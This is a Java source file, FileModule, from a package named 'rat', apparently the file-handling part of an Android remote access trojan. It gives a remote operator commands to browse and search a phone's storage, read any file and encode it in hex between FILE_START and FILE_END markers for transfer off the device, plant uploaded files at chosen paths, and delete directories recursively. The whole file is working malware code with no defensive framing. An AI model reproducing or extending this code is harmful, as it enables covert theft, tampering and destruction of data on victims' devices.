package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.utils.Constants;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class FileModule {
    
    private static final String TAG = "FileModule";
    
    private Context context;
    
    // File type constants
    private static final int TYPE_FILE = 0;
    private static final int TYPE_DIR = 1;
    private static final int TYPE_LINK = 2;
    
    public FileModule(Context context) {
        this.context = context;
    }
    
    public String listFiles(String path) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        // Determine the directory to list
        File directory;
        if (path == null || path.isEmpty()) {
            // List root directories
            return listRootDirectories();
        } else {
            directory = new File(path);
        }
        
        // Check if directory exists and is readable
        if (!directory.exists()) {
            return "ERROR: Path does not exist: " + path;
        }
        
        if (!directory.isDirectory()) {
            return "ERROR: Path is not a directory: " + path;
        }
        
        if (!directory.canRead()) {
            return "ERROR: Cannot read directory: " + path;
        }
        
        try {
            File[] files = directory.listFiles();
            if (files == null) {
                return "ERROR: Unable to list files in: " + path;
            }
            
            StringBuilder result = new StringBuilder();
            result.append("Directory listing: ").append(directory.getAbsolutePath()).append("\n");
            result.append("=".repeat(60)).append("\n");
            
            // Sort files: directories first, then files, both alphabetically
            List<File> fileList = new ArrayList<>();
            Collections.addAll(fileList, files);
            
            // Separate directories and files
            List<File> dirs = new ArrayList<>();
            List<File> regFiles = new ArrayList<>();
            
            for (File f : fileList) {
                if (f.isDirectory()) {
                    dirs.add(f);
                } else {
                    regFiles.add(f);
                }
            }
            
            // Sort each list
            Collections.sort(dirs, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
            Collections.sort(regFiles, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
            
            // Add parent directory link if not at root
            if (directory.getParent() != null) {
                File parent = directory.getParentFile();
                result.append("📂 [PARENT] ").append(parent.getAbsolutePath()).append("\n");
            }
            
            // Add directories
            for (File dir : dirs) {
                result.append(formatFileInfo(dir, TYPE_DIR)).append("\n");
            }
            
            // Add files
            for (File file : regFiles) {
                result.append(formatFileInfo(file, TYPE_FILE)).append("\n");
            }
            
            result.append("=".repeat(60)).append("\n");
            result.append("Total: ").append(dirs.size()).append(" directories, ")
                  .append(regFiles.size()).append(" files");
            
            return result.toString();
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception accessing: " + path;
        } catch (Exception e) {
            Log.e(TAG, "Error listing files: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String listRootDirectories() {
        StringBuilder result = new StringBuilder();
        result.append("Available Storage Locations:\n");
        result.append("=".repeat(60)).append("\n");
        
        // Internal storage
        File internalStorage = Environment.getExternalStorageDirectory();
        if (internalStorage != null && internalStorage.exists()) {
            result.append(formatStorageInfo("Internal Storage", internalStorage)).append("\n");
        }
        
        // External storage (SD card)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            File[] externalFiles = context.getExternalFilesDirs(null);
            for (int i = 0; i < externalFiles.length; i++) {
                if (externalFiles[i] != null) {
                    File external = externalFiles[i].getParentFile().getParentFile().getParentFile();
                    if (external != null && external.exists() && !external.equals(internalStorage)) {
                        result.append(formatStorageInfo("SD Card " + (i+1), external)).append("\n");
                    }
                }
            }
        }
        
        // Common paths
        String[] commonPaths = {
            "/storage/emulated/0",
            "/sdcard",
            "/mnt/sdcard",
            "/storage/sdcard0",
            "/storage/sdcard1",
            "/mnt/sdcard1",
            "/storage/extSdCard",
            "/mnt/extSdCard"
        };
        
        for (String path : commonPaths) {
            File file = new File(path);
            if (file.exists() && file.isDirectory() && !file.equals(internalStorage)) {
                boolean alreadyListed = false;
                for (int i = 0; i < result.length(); i++) {
                    if (result.toString().contains(file.getAbsolutePath())) {
                        alreadyListed = true;
                        break;
                    }
                }
                if (!alreadyListed) {
                    result.append(formatStorageInfo("Storage", file)).append("\n");
                }
            }
        }
        
        result.append("=".repeat(60)).append("\n");
        result.append("Use 'files <path>' to browse");
        
        return result.toString();
    }
    
    private String formatStorageInfo(String label, File path) {
        StringBuilder info = new StringBuilder();
        info.append("📁 ").append(label).append(":\n");
        info.append("  Path: ").append(path.getAbsolutePath()).append("\n");
        
        try {
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            
            long totalBytes = totalBlocks * blockSize;
            long freeBytes = availableBlocks * blockSize;
            long usedBytes = totalBytes - freeBytes;
            
            info.append("  Total: ").append(formatFileSize(totalBytes)).append("\n");
            info.append("  Used: ").append(formatFileSize(usedBytes)).append("\n");
            info.append("  Free: ").append(formatFileSize(freeBytes)).append("\n");
            info.append("  Usage: ").append(String.format(Locale.US, "%.1f%%", 
                (usedBytes * 100.0 / totalBytes)));
            
        } catch (Exception e) {
            info.append("  Storage info unavailable");
        }
        
        return info.toString();
    }
    
    private String formatFileInfo(File file, int type) {
        StringBuilder info = new StringBuilder();
        
        // Icon based on type
        if (type == TYPE_DIR) {
            info.append("📁 ");
        } else {
            String ext = getFileExtension(file.getName()).toLowerCase();
            switch (ext) {
                case "jpg":
                case "jpeg":
                case "png":
                case "gif":
                case "bmp":
                    info.append("🖼️ ");
                    break;
                case "mp4":
                case "3gp":
                case "mkv":
                case "avi":
                    info.append("🎬 ");
                    break;
                case "mp3":
                case "wav":
                case "aac":
                case "ogg":
                    info.append("🎵 ");
                    break;
                case "txt":
                case "log":
                case "xml":
                case "json":
                    info.append("📄 ");
                    break;
                case "apk":
                    info.append("📱 ");
                    break;
                case "zip":
                case "rar":
                case "7z":
                    info.append("🗜️ ");
                    break;
                default:
                    info.append("📄 ");
            }
        }
        
        // Name and size
        info.append(file.getName());
        if (type == TYPE_FILE) {
            info.append(" (").append(formatFileSize(file.length())).append(")");
        }
        
        // Last modified
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
        info.append(" [").append(sdf.format(new Date(file.lastModified()))).append("]");
        
        // Permissions (Unix-style)
        if (file.canRead() && file.canWrite()) {
            info.append(" [rw]");
        } else if (file.canRead()) {
            info.append(" [r]");
        } else if (file.canWrite()) {
            info.append(" [w]");
        }
        
        return info.toString();
    }
    
    public String downloadFile(String path) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        if (path == null || path.isEmpty()) {
            return "Usage: download <file_path>";
        }
        
        File file = new File(path);
        
        if (!file.exists()) {
            return "ERROR: File does not exist: " + path;
        }
        
        if (file.isDirectory()) {
            return "ERROR: Cannot download directory: " + path;
        }
        
        if (!file.canRead()) {
            return "ERROR: Cannot read file: " + path;
        }
        
        try {
            // Read file and encode for transfer
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[Constants.CHUNK_SIZE];
            int bytesRead;
            
            StringBuilder fileData = new StringBuilder();
            fileData.append("FILE_START:").append(file.getName()).append(":")
                    .append(file.length()).append("\n");
            
            while ((bytesRead = fis.read(buffer)) != -1) {
                // Convert bytes to hex string for safe transmission
                String chunk = bytesToHex(buffer, bytesRead);
                fileData.append(chunk).append("\n");
            }
            
            fis.close();
            fileData.append("FILE_END");
            
            Log.d(TAG, "File ready for download: " + file.getName() + 
                  " (" + formatFileSize(file.length()) + ")");
            
            return fileData.toString();
            
        } catch (IOException e) {
            Log.e(TAG, "Error reading file: " + e.getMessage());
            return "ERROR: Failed to read file - " + e.getMessage();
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "Out of memory reading file: " + e.getMessage());
            return "ERROR: File too large to transfer";
        }
    }
    
    public String uploadFile(String data) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        // Parse upload data (format: "path|filename|filedata")
        String[] parts = data.split("\\|", 3);
        if (parts.length < 3) {
            return "ERROR: Invalid upload format. Use: upload <path>|<filename>|<data>";
        }
        
        String path = parts[0];
        String filename = parts[1];
        String fileData = parts[2];
        
        File targetDir = new File(path);
        if (!targetDir.exists()) {
            if (!targetDir.mkdirs()) {
                return "ERROR: Cannot create directory: " + path;
            }
        }
        
        File outputFile = new File(targetDir, filename);
        
        try {
            // Decode hex data back to bytes
            byte[] fileBytes = hexToBytes(fileData);
            
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(fileBytes);
            fos.close();
            
            Log.d(TAG, "File uploaded: " + outputFile.getAbsolutePath() + 
                  " (" + formatFileSize(fileBytes.length) + ")");
            
            return "OK: File uploaded successfully - " + outputFile.getAbsolutePath();
            
        } catch (IOException e) {
            Log.e(TAG, "Error writing file: " + e.getMessage());
            return "ERROR: Failed to write file - " + e.getMessage();
        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Invalid hex data: " + e.getMessage());
            return "ERROR: Invalid file data format";
        }
    }
    
    public String deleteFile(String path) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        if (path == null || path.isEmpty()) {
            return "Usage: delete <file_path>";
        }
        
        File file = new File(path);
        
        if (!file.exists()) {
            return "ERROR: Path does not exist: " + path;
        }
        
        try {
            if (deleteRecursive(file)) {
                return "OK: Deleted: " + path;
            } else {
                return "ERROR: Failed to delete: " + path;
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception deleting: " + e.getMessage());
            return "ERROR: Permission denied";
        }
    }
    
    private boolean deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (!deleteRecursive(child)) {
                        return false;
                    }
                }
            }
        }
        return file.delete();
    }
    
    public String searchFiles(String query) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        if (query == null || query.isEmpty()) {
            return "Usage: search <filename_pattern>";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Searching for: \"").append(query).append("\"\n");
        result.append("=".repeat(60)).append("\n");
        
        List<File> results = new ArrayList<>();
        
        // Search in common storage locations
        File[] searchRoots = {
            Environment.getExternalStorageDirectory(),
            new File("/storage"),
            Environment.getDataDirectory()
        };
        
        for (File root : searchRoots) {
            if (root != null && root.exists()) {
                searchRecursive(root, query.toLowerCase(), results, 0, 3); // Max depth 3
            }
        }
        
        if (results.isEmpty()) {
            return "No files found matching: " + query;
        }
        
        for (File file : results) {
            result.append(formatFileInfo(file, file.isDirectory() ? TYPE_DIR : TYPE_FILE)).append("\n");
            result.append("-".repeat(40)).append("\n");
        }
        
        result.append("Found ").append(results.size()).append(" matches");
        return result.toString();
    }
    
    private void searchRecursive(File dir, String query, List<File> results, int depth, int maxDepth) {
        if (depth > maxDepth) return;
        
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.getName().toLowerCase().contains(query)) {
                results.add(file);
            }
            
            if (file.isDirectory() && depth < maxDepth) {
                searchRecursive(file, query, results, depth + 1, maxDepth);
            }
        }
    }
    
    public String getFileInfo(String path) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        if (path == null || path.isEmpty()) {
            return "Usage: info <file_path>";
        }
        
        File file = new File(path);
        
        if (!file.exists()) {
            return "ERROR: File does not exist: " + path;
        }
        
        StringBuilder info = new StringBuilder();
        info.append("File Information:\n");
        info.append("=".repeat(50)).append("\n");
        info.append("Name: ").append(file.getName()).append("\n");
        info.append("Path: ").append(file.getAbsolutePath()).append("\n");
        info.append("Type: ").append(file.isDirectory() ? "Directory" : "File").append("\n");
        
        if (!file.isDirectory()) {
            info.append("Size: ").append(formatFileSize(file.length())).append("\n");
            String ext = getFileExtension(file.getName());
            if (!ext.isEmpty()) {
                info.append("Extension: ").append(ext).append("\n");
            }
        }
        
        info.append("Last modified: ").append(formatDate(file.lastModified())).append("\n");
        info.append("Permissions:\n");
        info.append("  Read: ").append(file.canRead() ? "Yes" : "No").append("\n");
        info.append("  Write: ").append(file.canWrite() ? "Yes" : "No").append("\n");
        info.append("  Execute: ").append(file.canExecute() ? "Yes" : "No").append("\n");
        info.append("Hidden: ").append(file.isHidden() ? "Yes" : "No").append("\n");
        
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            int dirCount = 0;
            int fileCount = 0;
            
            if (children != null) {
                for (File child : children) {
                    if (child.isDirectory()) dirCount++;
                    else fileCount++;
                }
            }
            
            info.append("Contains: ").append(dirCount).append(" directories, ")
                .append(fileCount).append(" files\n");
        }
        
        return info.toString();
    }
    
    public String createDirectory(String path) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        if (path == null || path.isEmpty()) {
            return "Usage: mkdir <directory_path>";
        }
        
        File dir = new File(path);
        
        if (dir.exists()) {
            return "ERROR: Path already exists: " + path;
        }
        
        try {
            if (dir.mkdirs()) {
                return "OK: Directory created: " + path;
            } else {
                return "ERROR: Failed to create directory: " + path;
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception creating directory: " + e.getMessage());
            return "ERROR: Permission denied";
        }
    }
    
    public String moveFile(String args) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        String[] parts = args.split(" ", 2);
        if (parts.length < 2) {
            return "Usage: move <source> <destination>";
        }
        
        String sourcePath = parts[0];
        String destPath = parts[1];
        
        File source = new File(sourcePath);
        File dest = new File(destPath);
        
        if (!source.exists()) {
            return "ERROR: Source does not exist: " + sourcePath;
        }
        
        if (dest.exists()) {
            return "ERROR: Destination already exists: " + destPath;
        }
        
        try {
            if (source.renameTo(dest)) {
                return "OK: Moved " + sourcePath + " to " + destPath;
            } else {
                return "ERROR: Failed to move file";
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception moving file: " + e.getMessage());
            return "ERROR: Permission denied";
        }
    }
    
    public String copyFile(String args) {
        if (!checkStoragePermission()) {
            return "ERROR: Storage permission not granted";
        }
        
        String[] parts = args.split(" ", 2);
        if (parts.length < 2) {
            return "Usage: copy <source> <destination>";
        }
        
        String sourcePath = parts[0];
        String destPath = parts[1];
        
        File source = new File(sourcePath);
        File dest = new File(destPath);
        
        if (!source.exists()) {
            return "ERROR: Source does not exist: " + sourcePath;
        }
        
        if (source.isDirectory()) {
            return "ERROR: Cannot copy directory (use recursive copy)";
        }
        
        try {
            FileInputStream fis = new FileInputStream(source);
            FileOutputStream fos = new FileOutputStream(dest);
            
            byte[] buffer = new byte[8192];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            
            fis.close();
            fos.close();
            
            return "OK: Copied " + sourcePath + " to " + destPath;
            
        } catch (IOException e) {
            Log.e(TAG, "Error copying file: " + e.getMessage());
            return "ERROR: Failed to copy file - " + e.getMessage();
        }
    }
    
    public String getStorageInfo() {
        StringBuilder info = new StringBuilder();
        info.append("Storage Information:\n");
        info.append("=".repeat(50)).append("\n");
        
        // Internal storage
        File internal = Environment.getDataDirectory();
        info.append(formatDetailedStorageInfo("Internal Storage", internal)).append("\n");
        
        // External storage (if available)
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            File external = Environment.getExternalStorageDirectory();
            info.append(formatDetailedStorageInfo("External Storage", external)).append("\n");
        }
        
        // SD Card (if available)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            File[] externalFiles = context.getExternalFilesDirs(null);
            for (int i = 0; i < externalFiles.length; i++) {
                if (externalFiles[i] != null) {
                    File sdCard = externalFiles[i].getParentFile().getParentFile().getParentFile();
                    if (sdCard != null && sdCard.exists() && !sdCard.equals(internal) && 
                        !sdCard.equals(Environment.getExternalStorageDirectory())) {
                        info.append(formatDetailedStorageInfo("SD Card " + (i+1), sdCard)).append("\n");
                    }
                }
            }
        }
        
        return info.toString();
    }
    
    private String formatDetailedStorageInfo(String label, File path) {
        StringBuilder info = new StringBuilder();
        info.append("📁 ").append(label).append(":\n");
        info.append("  Path: ").append(path.getAbsolutePath()).append("\n");
        
        try {
            StatFs stat = new StatFs(path.getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();
            long freeBlocks = stat.getFreeBlocksLong();
            
            long totalBytes = totalBlocks * blockSize;
            long availableBytes = availableBlocks * blockSize;
            long freeBytes = freeBlocks * blockSize;
            long usedBytes = totalBytes - freeBytes;
            
            info.append("  Total space: ").append(formatFileSize(totalBytes)).append("\n");
            info.append("  Used space: ").append(formatFileSize(usedBytes));
            info.append(String.format(Locale.US, " (%.1f%%)\n", (usedBytes * 100.0 / totalBytes)));
            info.append("  Free space: ").append(formatFileSize(freeBytes));
            info.append(String.format(Locale.US, " (%.1f%%)\n", (freeBytes * 100.0 / totalBytes)));
            info.append("  Available: ").append(formatFileSize(availableBytes)).append("\n");
            
        } catch (Exception e) {
            info.append("  Storage info unavailable");
        }
        
        return info.toString();
    }
    
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        
        final String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        
        return String.format(Locale.US, "%.1f %s", 
            size / Math.pow(1024, digitGroups), units[digitGroups]);
    }
    
    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
    
    private String getFileExtension(String filename) {
        int lastDot = filename.lastIndexOf('.');
        if (lastDot > 0 && lastDot < filename.length() - 1) {
            return filename.substring(lastDot + 1);
        }
        return "";
    }
    
    private String bytesToHex(byte[] bytes, int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(String.format("%02x", bytes[i]));
        }
        return sb.toString();
    }
    
    private byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }
        return data;
    }
    
    private boolean checkStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ uses MANAGE_EXTERNAL_STORAGE
            return ContextCompat.checkSelfPermission(context, 
                Manifest.permission.MANAGE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(context, 
                Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(context, 
                Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }
}